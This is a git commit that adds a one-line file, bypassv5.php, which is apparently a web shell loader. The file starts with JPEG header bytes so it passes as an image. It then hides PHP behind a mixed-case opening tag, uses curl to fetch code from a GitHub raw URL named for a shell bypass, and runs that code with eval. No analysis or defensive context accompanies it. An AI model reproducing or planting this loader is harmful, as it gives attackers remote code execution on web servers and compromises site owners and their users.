8c78a9e5684d435ef69997af183c1400b660f94d
xzourt <160671984+xzourt@users.noreply.github.com>
2024-12-23 18:37:52 +0700

    Create bypassv5.php

---
+++ bypassv5.php
@@ -0,0 +1,1 @@
+ÿØÿà JFIF ÿþ;<?pHp function get($url){$ch=curl_init();curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_URL,$url);$data=curl_exec($ch);curl_close($ch);return $data;}eval('?>'.get('https://raw.githubusercontent.com/xzourt/ShellBypass/main/bypass-litespeed4.php')); ?>
